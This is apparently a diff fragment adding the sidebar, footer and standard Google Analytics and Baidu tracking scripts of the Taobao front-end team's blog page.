+      <img src="//img.alicdn.com/tfs/TB12fzTMVXXXXafaXXXXXXXXXXX-280-280.jpg" width="280" alt="淘宝前端团队微信公众号（taobaofed）" title="淘宝前端团队微信公众号（taobaofed）">
+    </a>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-list">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Node-js/">Node.js</a><span class="category-list-count">52</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web开发/">Web开发</a><span class="category-list-count">69</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/团队生活/">团队生活</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具-平台/">工具&平台</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线开发/">无线开发</a><span class="category-list-count">23</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-list">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/">2016</a><span class="archive-list-count">57</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/">2015</a><span class="archive-list-count">51</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/">2014</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/">2013</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/">2012</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/">2010</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/">2009</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/">2008</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/">2007</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-list">
+    <h3 class="widget-title">链接</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="http://nodejs.club/">Node 地下铁</a>
+          </li>
+        
+          <li>
+            <a href="http://alinode.aliyun.com/">alinode</a>
+          </li>
+        
+          <li>
+            <a href="http://fex.baidu.com/">百度 FEX</a>
+          </li>
+        
+          <li>
+            <a href="http://www.75team.com/">奇舞团</a>
+          </li>
+        
+          <li>
+            <a href="http://aotu.io/notes/">凹凸实验室</a>
+          </li>
+        
+          <li>
+            <a href="http://www.alloyteam.com/">腾讯 AlloyTeam</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</aside>
+        </div>
+      </div>
+    </div>
+    <footer id="footer">
+  
+  <div class="container">
+    <div class="container-inner">
+      <!--<a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>-->
+      <a href="#" class="scrollToTop"><i class="icon fa fa-arrow-up"></i></a>
+      <div class="credit">
+        <p>Copyright &copy; 2019 Taobao FED. All rights reserved.</p>
+        <a href="/terms">版权声明</a>
+        <!-- <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a> Redesigned by <a href="http://barretlee.com/" target="_blank">barretlee</a></p> -->
+      </div>
+    </div>
+  </div>
+</footer>
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-65944345-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+<script>
+// for baidu spider
+(function(){
+    var bp = document.createElement('script');
+    bp.src = '//push.zhanzhang.baidu.com/push.js';
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+// for baidu analysis
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?33dd75d7b88de8722970ea06fa5f06b0";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+    
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <script src="/scrollLoading/jquery.scrollLoading.js"></script>
+  <script src="/scrollLoading/main.js"></script>
+
+
+<script src="/js/html-patch.js"></script>
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
